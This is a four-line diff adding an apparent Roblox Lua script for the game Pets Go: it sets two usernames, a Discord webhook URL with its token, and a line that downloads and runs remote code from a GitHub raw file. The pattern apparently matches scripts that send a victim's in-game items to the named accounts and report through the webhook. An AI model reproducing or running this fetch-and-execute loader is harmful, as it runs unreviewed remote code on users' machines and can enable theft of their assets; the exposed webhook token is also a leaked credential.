@@ -1,0 +1,4 @@
+Username = "MansoorGmr "
+Username2 = "Ham16er"
+Webhook = "https://discord.com/api/webhooks/1315684412423143455/4JHH8Aiyc9ZtFXF9vK4mKykqT0DWX9_gbwHokRZZ2BbZyiJAsMY1XwfFaXBrT7Qqp18w"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LegitYTB/PsGO/refs/heads/main/PetsGO"))()
